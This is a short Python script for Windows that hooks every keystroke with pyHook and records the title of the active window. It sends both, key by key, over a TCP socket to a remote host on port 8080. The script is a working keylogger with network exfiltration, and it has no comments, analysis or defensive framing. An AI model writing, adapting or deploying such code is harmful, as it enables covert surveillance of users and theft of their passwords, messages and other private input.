import socket
import thread , threading
import pythoncom, pyHook
import win32gui
import os
import string
import time

HOST = ''
PORT = 8080

curWindow = None

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = ''

def OnKeyboardEvent(event):
  global curWindow
  abc = event.Key
  hook_value = event.Key
  print(event.Key)
  curcur = win32gui.GetForegroundWindow()
  winTitle = win32gui.GetWindowText(curcur)

  s.send('hooking Value :' + hook_value )
  if winTitle != curWindow:
      curWindow = winTitle
      s.send('hooking Value :' + winTitle )
  return True

def run():
	hm = pyHook.HookManager()
	hm.KeyDown = OnKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages()

def main():
    run()

if __name__ == "__main__":
    main()
